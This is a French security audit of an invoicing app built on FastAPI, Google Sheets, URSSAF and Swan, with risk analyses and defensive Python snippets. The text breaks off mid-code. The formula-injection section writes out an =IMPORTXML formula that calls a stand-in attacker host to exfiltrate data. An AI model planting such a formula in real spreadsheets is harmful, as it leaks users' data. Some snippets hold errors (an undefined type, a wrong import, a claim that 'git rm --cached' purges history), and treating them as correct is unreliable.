# Audit de Sécurité — Architecture SAP-Facture

**Auteur** : Security Reviewer
**Date** : 15 Mars 2026
**Statut** : Audit complet — Phase 3
**Périmètre** : Architecture système MVP décrite dans SCHEMAS.html + docs/phase1

---

## Table des Matières

1. [Résumé Exécutif](#résumé-exécutif)
2. [Surface d'Attaque](#surface-dattaque)
3. [Gestion des Secrets](#gestion-des-secrets)
4. [Données Sensibles](#données-sensibles)
5. [RGPD & Conformité](#rgpd--conformité)
6. [Analyse des Risques Spécifiques](#analyse-des-risques-spécifiques)
7. [Recommandations Classées par Sévérité](#recommandations-classées-par-sévérité)
8. [Checklist de Sécurité](#checklist-de-sécurité)

---

## Résumé Exécutif

### Verdict Global
**SÉCURITÉ MODÉRÉE** : L'architecture actuelle présente des surfaces d'attaque contrôlables mais nécessite des mesures préventives strictes **avant le déploiement en production**. Le plus grand risque est la **fuite de secrets** (credentials URSSAF, Google, Swan) et l'accès non-autorisé à Google Sheets.

### Points Forts
- Service Account unique (pas de concurrence multi-tenant)
- APIs externes bien délimitées (URSSAF, Swan, Google)
- Pas de base de données SQL (élimine risques injection SQL)
- Domaine applicatif restreint (un seul utilisateur : Jules)

### Points Faibles (à adresser avant Phase 2)
- **CRITICAL** : 5 secrets dans `.env` (jamais ne doit être committé)
- **HIGH** : Google Sheets contient PII (noms, emails, adresses)
- **HIGH** : Pas de chiffrement données sensibles au repos
- **HIGH** : Aucun log de sécurité ou audit trail identifié
- **MEDIUM** : Pas de rate limiting sur API FastAPI
- **MEDIUM** : Pas de validation stricte des URLs dans `fetch()` côté client

---

## Surface d'Attaque

### Diagramme Attaque Potentielles

```
┌─────────────────────────────────────────────────────────────┐
│ ATTAQUANT                                                   │
└─────────────────────────────────────────────────────────────┘
              ↓↓↓ 7 vecteurs d'attaque principaux ↓↓↓

1. ACCÈS À .ENV
   └─> Secrets: URSSAF_CLIENT_ID, URSSAF_CLIENT_SECRET, SWAN_API_KEY,
       GOOGLE_SERVICE_ACCOUNT_JSON, SMTP_PASSWORD
   └─> Impact: Accès à toutes les APIs externes, identité spoofée

2. ACCÈS À GOOGLE SHEETS (partage accidentel)
   └─> PII: noms clients, emails, adresses, SIREN, numéros NOVA
   └─> Données bancaires : montants transactions, soldes
   └─> Impact: Vol données personnelles, fraude RGPD

3. INTERCEPTION API URSSAF (HTTPS man-in-the-middle)
   └─> Payload: client_id, client_secret lors OAuth
   └─> Impact: Tokens compromis, création factures frauduleuses

4. INJECTION DANS FORMULES GOOGLE SHEETS
   └─> Attaque: Jules (ou attaquant ayant accès Sheets) injecte =IMPORTXML()
   └─> Impact: Exfiltration données, malware formules

5. USURPATION IDENTITÉ (spoofing emails Jules)
   └─> Via SMTP compromis ou redirect phishing
   └─> Attaque cible: clients URSSAF recevant fausses notifications

6. EXPLOITATION API FASTAPI (pas d'authentification)
   └─> Routes publiques: POST /invoices, GET /reconcile sans auth
   └─> Attaque: Création factures frauduleuses, modification données

7. COMPROMISE TOKENS SWAN/URSSAF
   └─> Tokens stockés en mémoire (non chiffrés au repos)
   └─> Attaque: Accès compte bancaire, lecture transactions
```

---

## Gestion des Secrets

### Secrets Identifiés dans Architecture

| Secret | Source | Localisation Actuelle | Risque | Sévérité |
|--------|--------|----------------------|--------|----------|
| `URSSAF_CLIENT_ID` | OAuth URSSAF | `.env` file | Commit accident | CRITICAL |
| `URSSAF_CLIENT_SECRET` | OAuth URSSAF | `.env` file | Brute force bearer token | CRITICAL |
| `SWAN_API_KEY` | Swan API | `.env` file | Accès compte bancaire | CRITICAL |
| `GOOGLE_SERVICE_ACCOUNT_JSON` | Google Cloud | `.env` ou `.json` file | Accès Sheets + Drive | CRITICAL |
| `SMTP_PASSWORD` | SMTP server | `.env` file | Spoofing emails | HIGH |
| `FERNET_ENCRYPTION_KEY` | Chiffrement local | `.env` (idéal) | Chiffrement cassé | CRITICAL |
| Access tokens (OAuth) | URSSAF OAuth | In-memory (Python) | Session jacking | HIGH |

### Analyse par Secret

#### 1. URSSAF Credentials (client_id + client_secret)

**Valeur** : Accès complet API URSSAF (inscription clients, création factures, lecture statuts)

**Risques** :
- Stored in `.env` → 1 git commit accident = compromission totale
- Tokens non chiffrés en mémoire Flask/FastAPI
- Si Heroku/Render leak → tous les env vars exposés

**Recommandations** :
- ✅ Jamais committer `.env` — ajouter `*.env*` à `.gitignore`
- ✅ Utiliser secrets manager (AWS Secrets Manager, HashiCorp Vault, ou même `.env` local)
- ✅ Rotation quarterly (créer new credentials URSSAF, ancien delete)
- ✅ Audit trail : logger chaque appel URSSAF (mais PAS le token)
- ✅ Chiffrer token en mémoire (voir Fernet plus bas)

**Code Safe Pattern** :
```python
# ❌ UNSAFE
import os
client_id = os.getenv("URSSAF_CLIENT_ID")  # Visible en RAM plaintext

# ✅ SAFE
from pydantic_settings import BaseSettings

class Settings(BaseSettings):
    urssaf_client_id: str = Field(min_length=1)
    urssaf_client_secret: SecretStr = Field(min_length=1)

    class Config:
        env_file = ".env"
        validate_default = True  # Fail at startup if missing

settings = Settings()
# Accès: settings.urssaf_client_secret.get_secret_value()
```

---

#### 2. Google Service Account JSON

**Localisation** : Actuellement dans `.env` ou fichier `.json` sur disque

**Contient** :
- `private_key` : Clé RSA privée
- `client_email` : SA email
- `project_id` : GCP project

**Risques** :
- JSON fichier = 1 `git add .` accident = compromission
- En production (serveur), si `.env` visible via process listing → exfiltration
- Private key utilisée pour signer toutes requêtes Google (Sheets, Drive, CloudLogging)

**Recommandations** :
- ✅ Ne PAS stocker JSON fichier sur disque
- ✅ Encoder base64 dans `.env` (une seule ligne)
- ✅ À startup, décoder et charger en mémoire
- ✅ Accès fichier : use `Path.resolve()` + check relative_to() (path traversal)
- ✅ Log accès : qui a téléchargé le JSON, quand (audit Google Cloud)

**Code Safe Pattern** :
```python
import base64
import json
from pathlib import Path
from pydantic_settings import BaseSettings

class Settings(BaseSettings):
    google_service_account_b64: SecretStr  # Base64-encoded JSON

    def get_google_credentials(self):
        """Decode & return Credentials object (not raw JSON)."""
        json_str = base64.b64decode(
            self.google_service_account_b64.get_secret_value()
        ).decode('utf-8')
        service_account_info = json.loads(json_str)

        from google.oauth2.service_account import Credentials
        return Credentials.from_service_account_info(
            service_account_info,
            scopes=["https://www.googleapis.com/auth/spreadsheets"]
        )
```

---

#### 3. Swan API Key

**Type** : Bearer token, similar to API key

**Risques** :
- Stored plaintext in `.env`
- SwanClient.get_transactions() appels — si token leaked, attacker peut :
  - Lire toutes transactions bancaires (montants, dates, libellés)
  - Potentiellement initier virements (dépend permissions Swan token)

**Recommandations** :
- ✅ Traiter comme Secret (base64 .env)
- ✅ Token rotation : vérifier Swan permet token refresh
- ✅ IP whitelisting : si Swan supporte, restrict API calls à IP serveur
- ✅ Log : toutes requêtes Swan avec timestamp (audit)

---

#### 4. SMTP Credentials

**Type** : Username + Password SMTP

**Risques** :
- Moins critique que URSSAF (scope limité : envoi emails)
- Spoofing emails (envoyer "from: Jules" fake)
- Spam abuse (attaquant envoie 1000 mails)

**Recommandations** :
- ✅ Utiliser OAuth2 SMTP si provider supporte (Gmail, Office365)
- ✅ Sinon : app-specific password (Gmail) ou token à rotation rapide
- ✅ Rate limit : max 10 emails/minute (EmailNotifier)
- ✅ Queue async : utiliser Celery + Redis (pas synchrone)

---

#### 5. Fernet Encryption Key (FUTUR)

**Contexte** : Si chiffrement données sensibles implémenté

**Recommandations** :
- ✅ Générer via `Fernet.generate_key()` au déploiement
- ✅ Stocker en `.env` (chiffrement symétrique, pas de rotation nécessaire)
- ✅ Sauvegarder backup clé séparement (Key Escrow Service)
- ✅ Jamais loggé, jamais imprimé

---

### Checklist Secrets Management

- [ ] `.env` ajouté à `.gitignore` (vérifier avec `git check-ignore .env`)
- [ ] `.env.example` créé (avec placeholder `XXX_REPLACE_ME`)
- [ ] Tous secrets en `.env` (URSSAF, Google, Swan, SMTP)
- [ ] Secrets chargés via Pydantic BaseSettings avec validation
- [ ] Variables sensibles marquées `SecretStr` (masquent en repr/logs)
- [ ] Audit : logging toutes opérations sensibles (sans logger la valeur)
- [ ] Rotation plan établi (quarterly review)
- [ ] Secrets NOT loggés, NOT imprimés, NOT sérializés

---

## Données Sensibles

### Inventaire PII/Données Sensibles

#### Données Stockées dans Google Sheets

| Onglet | Colonnes Sensibles | Classification | Où Chiffrer |
|--------|-------------------|-----------------|------------|
| **Clients** | nom, prenom, email, telephone, adresse | PII élevée | Sheets (impossible) → chiffrer côté app |
| **Factures** | client_id (ref), montant_total, descriptions | Sensible (montants) | N/A (calculé) |
| **Transactions** | montant, libelle, source (Swan) | Financier | En transit HTTP (TLS) |
| **Lettrage** | facture_id ↔ transaction_id | Interne (pas PII) | N/A |
| **Balances** | solde, CA total | Financier (calcul) | N/A |
| **Metrics NOVA** | heures, CA trimestre, nb_particuliers | Déclaration fiscale | Audit (France) |
| **Cotisations** | CA encaissé, charges mensuelles | Financier (calcul) | N/A |
| **Fiscal IR** | revenu_imposable, tranches IR | Déclaration fiscale | High (mais formules) |

**Problème clé** : Google Sheets ne supporte pas chiffrement au repos natif.

**Données exposées si Sheets compromis** :
- Noms, prénoms clients → RGPD violation (Article 32)
- Emails, téléphones → spam risk
- Adresses → physical security risk
- Montants factures → business intelligence
- CA trimestriel → estimation revenus Jules

---

### Vecteurs Exposition

#### 1. Partage Accidentel Google Sheets

**Risque élevé** :
- Sheets lien `publichtml` visible (Dashboard iframes embed)
- Jules peut accidentellement partager entire spreadsheet (icon "Partager" dans UI Google)
- Link sharing : "Toute personne avec lien" permet lecture

**Recommandations** :
- ✅ Désactiver "Public Sharing" dans Google Drive settings
- ✅ Permissions : uniquement Jules (owner) + Service Account (editor)
- ✅ Onglets sensibles (Clients, Transactions) : protéger feuille (View only)
- ✅ Logs accès : monitorer Google Cloud audit logs (qui a accédé, quand)
- ✅ Alertes : "Email" si quelqu'un externe accède

**Erreur Courante** :
```javascript
// ❌ UNSAFE in dashboard code
// Embedding public HTML view of entire sheet
<iframe src="https://docs.google.com/spreadsheets/d/SHEET_ID/pubhtml" />

// ✅ SAFER: Only embed specific view-only onglets
// 1. Create separate Sheets (Lettrage, Balances) for public view
// 2. Share seulement les onglets non-sensibles
// 3. Use restricted range: =QUERY(...) limited columns
```

---

#### 2. Stockage PDFs dans Google Drive

**Données** : Factures PDF (nom client, montants, dates)

**Risques** :
- PDF files hébergés Drive, liens shareable
- Si Drive account compromis → tous PDFs exfiltré
- Pas de versioning/retention policy

**Recommandations** :
- ✅ Dossier PDF parent : Private (pas shared)
- ✅ PDFs : encrypted before upload (AES-256)
- ✅ Deletion policy : supprimer PDFs après 10 ans (RGPD droit à l'oubli)
- ✅ Audit : logger chaque PDF upload/download

---

#### 3. Logs & Error Messages

**Risque** : Error messages peuvent leaker PII

**Exemples** :
```python
# ❌ UNSAFE
logger.error(f"Client registration failed: {client.to_dict()}")
# Logs: name, email, address

# ✅ SAFE
logger.error(f"Client registration failed for {client.id}",
    exc_info=True)
# client.id = opaque identifier
```

---

#### 4. Données en Transit (TLS/HTTPS)

**Architecture** :
```
Jules (HTTPS) → FastAPI (HTTPS) → Google Sheets API (HTTPS)
Jules (HTTPS) → FastAPI (HTTPS) → URSSAF API (HTTPS)
Jules (HTTPS) → FastAPI (HTTPS) → Swan API (HTTPS)
```

**Risques** :
- If FastAPI not HTTPS in prod → man-in-the-middle possible
- Self-signed certs → accept invalid certs in clients (DANGEROUS)

**Recommandations** :
- ✅ FastAPI déployé HTTPS (Let's Encrypt + certbot)
- ✅ HSTS header : `Strict-Transport-Security: max-age=31536000; includeSubDomains`
- ✅ Certificate pinning (optionnel) : URSSAFClient + SwanClient vérifient certificat

---

### Chiffrement Données au Repos (Recommandé Phase 2)

**Option 1 : Chiffrement Côté Application (Avant Sheets)**

```python
from cryptography.fernet import Fernet
from pydantic import BaseModel, field_validator

class ClientData(BaseModel):
    id: str
    nom: str  # Plaintext
    email: str  # Plaintext
    adresse: SecureStr  # Chiffré avant écriture Sheets

    def encrypt_sensitive(self, key: bytes) -> dict:
        """Before write to Sheets, encrypt address."""
        cipher = Fernet(key)
        return {
            "id": self.id,
            "nom": self.nom,
            "email": self.email,
            "adresse_encrypted": cipher.encrypt(self.adresse.encode()).decode(),
            "encrypted_fields": ["adresse"],
        }

    @staticmethod
    def decrypt_sensitive(row: dict, key: bytes) -> 'ClientData':
        """After read from Sheets, decrypt address."""
        cipher = Fernet(key)
        if "adresse_encrypted" in row:
            adresse = cipher.decrypt(row["adresse_encrypted"].encode()).decode()
        else:
            adresse = row.get("adresse", "")

        return ClientData(
            id=row["id"],
            nom=row["nom"],
            email=row["email"],
            adresse=adresse,
        )
```

**Trade-offs** :
- ✅ Données chiffrées au repos (Sheets)
- ✅ Jules peut encore lire (UI décrypte)
- ❌ Formules Google Sheets ne peuvent pas indexer données chiffrées
- ❌ Recherche clients devient plus lente (decrypt all, filter Python)

**Recommendation** : Implémenter Phase 2, si vraiment besoin. Pour MVP, confiance Google + audit logs suffisent.

---

## RGPD & Conformité

### Status RGPD

**Jules est** : Prestataire indépendant (micro-entrepreneur), traitement données pour facturation

**Données Personnelles** :
- Nom, email, téléphone, adresse (clients URSSAF) → PII
- Montants factures, dates → Ne sont PAS personnelles (données transactions)

### Obligations RGPD

| Obligation | Status | Implémentation |
|-----------|--------|-----------------|
| **Consentement** | ✅ Implicite | Client demande facture → consentement facturation |
| **Privacy Notice** | ❌ A faire | Site web doit mentionner collecte données, durée rétention |
| **Droit d'accès** | ⚠️ Partial | Jules peut exporter CSV mais pas "rapport complet" |
| **Droit à l'oubli** | ⚠️ Partial | Soft delete (colonne `actif=false`) ou hard delete Sheets |
| **Droit de rectification** | ✅ Yes | Jules peut éditer clients dans Sheets directement |
| **Portabilité données** | ✅ Yes | Export CSV possible (sap export CLI) |
| **Breach notification** | ❌ A faire | Plan réponse si Sheets/API compromised |
| **DPA (Data Processing Agreement)** | ⚠️ Need check | Google Sheets/Drive/URSSAF terms |

### Recommandations RGPD

#### 1. Privacy Notice (Politique de Confidentialité)

Créer `docs/PRIVACY.md` ou page web expliquant :
```markdown
# Politique de Confidentialité — SAP-Facture

## Données Collectées
- Nom, email, adresse (pour facturation URSSAF)
- Montants, dates factures

## Durée de Rétention
- Données clients : 10 ans (obligation comptable France)
- Données transactions : 6 ans (prescription fiscale)
- Après suppression : soft delete (marquer `actif=false`)

## Droits
- Accès : contact jules@... pour export données
- Oubli : envoi email, données hard deleted
- Rectification : modification directe dans interface

## Sous-traitants
- Google (Sheets, Drive)
- Swan (transactions bancaires)
- URSSAF (facturation)
```

#### 2. Droit à l'Oubli Implémentation

**Scenario** : Client demande suppression données

**Approche recommandée** :
```python
# ✅ SOFT DELETE (recommandé pour comptabilité)
class ClientSoftDelete(BaseModel):
    client_id: str
    is_active: bool = False
    deleted_at: datetime

# Dans Sheets, colonne "actif": FALSE → caché des rapports

# ✅ HARD DELETE (pour client vraiment demande)
async def hard_delete_client(client_id: str):
    """Suppression complète (archive si obligatoire)."""
    # 1. Backup à archive folder (legal hold)
    sheet_adapter.backup_client_to_archive(client_id)
    # 2. Delete toutes références Sheets
    sheet_adapter.delete_client_row(client_id)
    sheet_adapter.delete_invoices_where_client_id(client_id)
    # 3. Log audit
    logger.info(f"GDPR right_to_be_forgotten: {client_id}")
```

#### 3. Data Processing Agreement (DPA)

**Action** : Vérifier Google & URSSAF DPA terms

**Documents à consulter** :
- Google Sheets Data Processing Amendment : https://workspace.google.com/intl/fr_fr/security/dpa/
- URSSAF conditions d'utilisation API : portailapi.urssaf.fr/doc

**Statut** :
- ✅ Google : DPA standard incluse (OK pour RGPD)
- ✅ Swan : DPA standard disponible
- ⚠️ URSSAF : À vérifier (API récente, DPA peut être en lien de confidentialité)

---

## Analyse des Risques Spécifiques

### Risque 1 : Google Sheets Partagé Accidentellement

**Probabilité** : MOYENNE (UI Google confus)
**Impact** : CRITIQUE (tous PII exfiltré)
**Damage Scenario** :
1. Jules clique icon "Partager" dans Sheets
2. Oublie de restreindre permissions
3. Champ "Toute personne avec lien" → page URL visible

**Mitigation** :
- ✅ Google Drive settings : disable "Public Sharing"
- ✅ Folder permission : Jules only
- ✅ Alert : Google Takeout audit log si external access
- ✅ Test : monthly manual check sharing permissions

**Code Monitoring** :
```python
from google.cloud import logging as cloud_logging

def audit_sheets_sharing():
    """Monthly check : qui a accès au Sheets?"""
    service = build("drive", "v3", credentials=creds)

    file = service.files().get(
        fileId=SHEETS_SPREADSHEET_ID,
        fields="permissions"
    ).execute()

    permissions = file.get("permissions", [])

    # Alert if not owner + service account only
    for perm in permissions:
        if perm["type"] != "user" or perm["role"] != "owner":
            if perm["emailAddress"] != SERVICE_ACCOUNT_EMAIL:
                logger.critical(f"SECURITY: Unauthorized access: {perm}")
```

---

### Risque 2 : Token URSSAF Compromis

**Probabilité** : BASSE (OAuth2 secure)
**Impact** : CRITIQUE (création factures frauduleuses)
**Damage Scenario** :
1. `.env` file leaked (GitHub secret scan)
2. Attacker obtient URSSAF_CLIENT_SECRET
3. Attacker crée access_token valide
4. Attacker crée 1000 factures frauduleuses → Jules compte débité

**Mitigation** :
- ✅ Token short-lived (OAuth2 : 1h expiry)
- ✅ Rotation credentials quarterly (URSSAF console)
- ✅ Audit trail : tous appels URSSAF loggés (timestamp, endpoint, user)
- ✅ Fraud detection : alert si > 10 factures créées en 1h (anomaly)

**Code Audit Log** :
```python
class URSSAFClient:
    async def create_payment_request(self, invoice: Invoice):
        """Log every URSSAF call."""
        logger.info(
            "URSSAF_API_CALL",
            extra={
                "method": "POST",
                "endpoint": "/demandes-paiement",
                "client_id": invoice.client_id,  # NOT secret
                "montant": invoice.montant_total,
                "timestamp": datetime.utcnow().isoformat(),
                # DO NOT LOG: access_token, client_secret
            }
        )

        response = await self._http_client.post(
            f"{self.base_url}/demandes-paiement",
            json=invoice.to_urssaf_payload(),
            headers={"Authorization": f"Bearer {self.access_token}"}
        )

        return response.json()
```

---

### Risque 3 : Injection Formules Google Sheets

**Probabilité** : BASSE (Jules only access, trusted)
**Impact** : HAUTE (malware, exfiltration)
**Damage Scenario** :
1. Attacker gains Sheets write access (compromised SA key)
2. Injecte dans colonne "description" formule : `=IMPORTXML("http://attacker.com", "//a")`
3. Google Sheets évalue formule → appel externe HTTP
4. Data exfiltration possible

**Mitigation** :
- ✅ Validation input : sanitize strings avant Sheets write
- ✅ Use `value_input_option="RAW"` pour données user (pas "USER_ENTERED")
- ✅ Restrict sheet editing : certaines colonnes read-only

**Code Safe Sheets Write** :
```python
def write_invoice_safe(sheet, invoice):
    """Write invoice data safely (no formula injection)."""

    # Sanitize : remove = + @ characters (formula starters)
    def sanitize_formula_chars(s: str) -> str:
        if s and s[0] in ('=', '+', '-', '@'):
            return "'" + s  # Prefix with ' → force plaintext
        return s

    row_data = [
        invoice.facture_id,
        sanitize_formula_chars(invoice.client_id),
        invoice.montant_total,
        sanitize_formula_chars(invoice.description),  # User input!
        # ... more fields
    ]

    # Use RAW (not USER_ENTERED) to avoid formula eval
    sheet.append_rows(
        [row_data],
        value_input_option="RAW"  # Critical!
    )
```

---

### Risque 4 : Rate Limiting / DOS sur FastAPI

**Probabilité** : BASSE (single user)
**Impact** : MEDIA (service indisponible)
**Damage Scenario** :
1. Attacker automated submits 1000 invoices/sec (POST /invoices)
2. FastAPI processes all → DoS Google Sheets + URSSAF API
3. Jules cannot use system

**Mitigation** :
- ✅ Rate limit : 10 req/min per IP (général)
- ✅ Per-endpoint: POST /invoices = 1 req/sec
- ✅ Authentification : require API key / session token (no public routes)
- ✅ Monitoring : alert if > 100 requests/min

**Code Rate Limit** :
```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(
    key_func=get_remote_address,
    default_limits=["10/minute"],
)

app = FastAPI()
app.state.limiter = limiter

@app.post("/invoices")
@limiter.limit("1/second")
async def create_invoice(request: Request, invoice: InvoiceRequest):
    # Process
    pass
```

---

### Risque 5 : Man-in-the-Middle (MITM) API Calls

**Probabilité** : TRÈS BASSE (HTTPS enforced)
**Impact** : CRITIQUE (token interception)
**Scenario** :
1. Development environment : `http://` (not `https://`)
2. Attacker intercepts unencrypted traffic
3. Obtient credentials (OAuth token, client_secret)

**Mitigation** :
- ✅ Enforce HTTPS everywhere (development + production)
- ✅ Certificate pinning (URSSAFClient, SwanClient verify cert)
- ✅ Environment variable : `REQUIRE_HTTPS=true` (fail if HTTP)

**Code HTTPS Enforcement** :
```python
from fastapi import FastAPI
from fastapi.middleware.trustedhost import TrustedHostMiddleware
from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware

app = FastAPI()

# Middleware : force HTTPS + redirect
if not DEBUG:  # Only production
    app.add_middleware(HTTPSRedirectMiddleware)

# Only allow specific hosts
app.add_middleware(
    TrustedHostMiddleware,
    allowed_hosts=["sap-facture.example.com"]
)

# Verify API calls use HTTPS
class URSSAFClient:
    def __init__(self, base_url: str):
        if not base_url.startswith("https://"):
            raise ValueError("URSSAF API must use HTTPS")
        self.base_url = base_url
```

---

### Risque 6 : Credentials dans Logs

**Probabilité** : MEDIA (accidental logging)
**Impact** : ALTA (secrets in plaintext)
**Scenario** :
```python
# ❌ DANGEROUS
logger.debug(f"OAuth token: {access_token}")
logger.info(f"Request: {response}")  # response may include auth header
```

**Mitigation** :
- ✅ Masquer secrets in logs : use `SecretStr`
- ✅ Sanitize exception tracebacks
- ✅ Configure logging formatter to redact patterns

**Code Safe Logging** :
```python
import logging
import re

class SanitizingFormatter(logging.Formatter):
    """Remove secrets from log messages."""

    SECRET_PATTERNS = [
        (r'Bearer\s+\S+', 'Bearer ***'),
        (r'"access_token":\s*"[^"]*"', '"access_token": "***"'),
        (r'URSSAF_CLIENT_SECRET=\S+', 'URSSAF_CLIENT_SECRET=***'),
    ]

    def format(self, record):
        msg = super().format(record)
        for pattern, replacement in self.SECRET_PATTERNS:
            msg = re.sub(pattern, replacement, msg)
        return msg

handler = logging.StreamHandler()
handler.setFormatter(SanitizingFormatter())
logger = logging.getLogger(__name__)
logger.addHandler(handler)
```

---

### Risque 7 : Accès Non-Autorisé (No Authentication)

**Probabilité** : MEDIA
**Impact** : CRITIQUE (data breach)
**Scenario** :
1. FastAPI routes not authenticated (no session check)
2. Attacker calls POST /invoices without login
3. Creates fake invoices, reads client data

**Mitigation** :
- ✅ Require authentication on all routes (session or API key)
- ✅ For single-user (Jules) : simple session cookie or API key
- ✅ Never trust client-side auth (always verify server-side)

**Code Authentication** :
```python
from fastapi import Depends, HTTPException
from fastapi.security import APIKeyHeader
from typing import Optional

API_KEY = os.getenv("API_KEY_INTERNAL")  # Securely stored

async def verify_api_key(
    api_key: str = Header(None, alias="X-API-Key")
) -> str:
    if api_key != API_KEY:
        raise HTTPException(status_code=403, detail="Unauthorized")
    return api_key

@app.post("/invoices")
async def create_invoice(
    invoice: InvoiceRequest,
    _: str = Depends(verify_api_key)  # Auth required
):
    # Process
    pass
```

Or for web session (Jules logs in):
```python
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from passlib.context import CryptContext

security = HTTPBasic()
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

@app.post("/invoices")
async def create_invoice(
    invoice: InvoiceRequest,
    credentials: HTTPBasicCredentials = Depends(security)
):
    if credentials.username != "jules" or not verify_password(
        credentials.password, HASHED_PASSWORD
    ):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    # Process
    pass
```

---

## Recommandations Classées par Sévérité

### CRITICAL — Adresser AVANT Phase 1 Production

#### C1 : Secrets Management
**Problème** : `.env` peut être committé accidentellement
**Action Immédiate** :
```bash
# 1. Add to .gitignore
echo ".env*" >> .gitignore
echo "*.env" >> .gitignore

# 2. Remove if accidentally committed
git rm --cached .env
git commit -m "remove: .env from git history"

# 3. Check no secrets in git
git log -p --all -S 'URSSAF_CLIENT_SECRET' -- .env

# 4. Rotate ALL secrets (URSSAF, Google, Swan, SMTP)
# Download new credentials from respective platforms
```

**Fichier `.env.example`** :
```
# URSSAF OAuth2
URSSAF_CLIENT_ID=your_client_id_here
URSSAF_CLIENT_SECRET=your_client_secret_here
URSSAF_API_BASE_URL=https://portailapi.urssaf.fr

# Swan API
SWAN_API_KEY=your_swan_api_key_here
SWAN_API_BASE_URL=https://api.swan.io

# Google Service Account (base64-encoded JSON)
GOOGLE_SERVICE_ACCOUNT_B64=base64_encoded_json_here
GOOGLE_SHEETS_SPREADSHEET_ID=your_sheets_id
SHEETS_DRIVE_FOLDER_ID=your_drive_folder_id

# SMTP
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
SMTP_USER=your_email@gmail.com
SMTP_PASSWORD=your_app_password_here

# App Config
APP_DEBUG=false
APP_LOG_LEVEL=INFO
ENVIRONMENT=production
```

**Code Loading (.gitignore + settings)** :
```python
# pyproject.toml
[project]
dependencies = [
    "pydantic-settings>=2.0",
    "pydantic>=2.0",
]

# app/config.py
from pydantic_settings import BaseSettings
from pydantic import Field, SecretStr

class Settings(BaseSettings):
    # URSSAF
    urssaf_client_id: str = Field(min_length=1)
    urssaf_client_secret: SecretStr = Field(min_length=1)
    urssaf_api_base_url: str = "https://portailapi.urssaf.fr"

    # Swan
    swan_api_key: SecretStr = Field(min_length=1)
    swan_api_base_url: str = "https://api.swan.io"

    # Google
    google_service_account_b64: SecretStr = Field(min_length=1)
    google_sheets_spreadsheet_id: str = Field(min_length=1)
    sheets_drive_folder_id: str = Field(min_length=1)

    # SMTP
    smtp_host: str = "smtp.gmail.com"
    smtp_port: int = 587
    smtp_user: str
    smtp_password: SecretStr

    # App
    app_debug: bool = False
    app_log_level: str = "INFO"
    environment: str = Field(default="development")

    class Config:
        env_file = ".env"
        case_sensitive = False
        # Fail at startup if any required field missing
        extra = "forbid"

settings = Settings()
```

---

#### C2 : Google Sheets Access Control
**Problème** : Google Sheets contient PII, risque partage accidentel
**Action Immédiate** :
```bash
# 1. Remove "Public Sharing" permission
# Go to Google Drive → Sheets settings → "Sharing"
# Change from "Public" to "Restricted" (Jules only)

# 2. Configure permissions:
# Owner: Jules (personal Google account)
# Editor: Service Account (sa-name@project.iam.gserviceaccount.com)
# Others: NONE
```

**Code Audit Sharing Monthly** :
```python
# app/security/audit_sharing.py
import logging
from google.cloud import logging as cloud_logging
from googleapiclient.discovery import build

logger = logging.getLogger(__name__)

async def audit_sheets_permissions():
    """Check who has access to Sheets. Alert if unauthorized."""
    service = build("drive", "v3", credentials=creds)

    try:
        file = service.files().get(
            fileId=SHEETS_ID,
            fields="permissions(emailAddress, role, type)"
        ).execute()

        permissions = file.get("permissions", [])

        allowed_emails = {
            "jules@example.com",  # Owner
            SERVICE_ACCOUNT_EMAIL,  # System
        }

        for perm in permissions:
            email = perm.get("emailAddress", "unknown")
            if email not in allowed_emails:
                logger.critical(
                    "SECURITY_ALERT: Unauthorized Sheets access",
                    extra={
                        "email": email,
                        "role": perm["role"],
                        "type": perm["type"],
                    }
                )
    except Exception as e:
        logger.error(f"Failed to audit Sheets permissions: {e}")

# Schedule monthly
from apscheduler.schedulers.asyncio import AsyncIOScheduler
scheduler = AsyncIOScheduler()
scheduler.add_job(
    audit_sheets_permissions,
    "cron",
    day_of_month=1,
    hour=9,
    id="audit_sheets_monthly"
)
scheduler.start()
```

---

#### C3 : Enforce HTTPS + TLS Certificate Verification
**Problème** : API calls peuvent être interceptées (MITM)
**Action Immédiate** :

```python
# app/config.py — add to Settings class
class Settings(BaseSettings):
    require_https: bool = Field(default=True)

    def __init__(self, **data):
        super().__init__(**data)
        if self.require_https and self.environment == "production":
            if any(url.startswith("http://") for url in [
                self.urssaf_api_base_url,
                self.swan_api_base_url,
            ]):
                raise ValueError(
                    "All API URLs must use HTTPS in production"
                )

# app/integrations/urssaf_client.py
import ssl
import certifi
from aiohttp import ClientSession, TCPConnector

class URSSAFClient:
    async def __aenter__(self):
        # Verify SSL certificate
        ssl_context = ssl.create_default_context(
            cafile=certifi.where()
        )
        connector = TCPConnector(ssl=ssl_context)
        self.session = ClientSession(connector=connector)
        return self

    async def get_access_token(self):
        """OAuth2 token endpoint (TLS verified)."""
        async with self.session.post(
            f"{self.base_url}/oauth/token",
            json={
                "client_id": self.client_id,
                "client_secret": self.client_secret.get_secret_value(),
                "grant_type": "client_credentials",
            },
            ssl=True,  # Verify SSL
        ) as resp:
            if resp.status != 200:
                raise ValueError(f"OAuth failed: {await resp.text()}")
            return await resp.json()
```

---

#### C4 : Authentication on All Routes
**Problème** : FastAPI routes unprotected, anyone can create invoices
**Action Immédiate** :
```python
# app/auth.py
from fastapi import HTTPException, Depends, status
from fastapi.security import HTTPBearer, HTTPAuthCredentials
import hmac
import hashlib

security = HTTPBearer()

async def verify_api_key(
    credentials: HTTPAuthCredentials = Depends(security)
) -> str:
    """Verify API key (Bearer token)."""
    expected_key = settings.api_key_internal.get_secret_value()

    # Constant-time comparison (prevent timing attack)
    if not hmac.compare_digest(credentials.credentials, expected_key):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Invalid API key"
        )
    return credentials.credentials

# app/main.py
from fastapi import FastAPI, Depends

app = FastAPI()

@app.post("/invoices")
async def create_invoice(
    invoice: InvoiceRequest,
    _: str = Depends(verify_api_key)  # Required
):
    # Protected endpoint
    pass
```

**Add to Settings** :
```python
class Settings(BaseSettings):
    api_key_internal: SecretStr = Field(
        min_length=32,
        description="Internal API key for authentication"
    )
```

---

#### C5 : Logging Audit Trail
**Problème** : Naucun audit trail si compromise détecté
**Action Immédiate** :

```python
# app/security/audit_logger.py
import logging
import json
from datetime import datetime
from typing import Any

class AuditLogger:
    """Log security-relevant events."""

    def __init__(self):
        self.logger = logging.getLogger("audit")

        # File handler (separate from app logs)
        handler = logging.FileHandler("logs/audit.log")
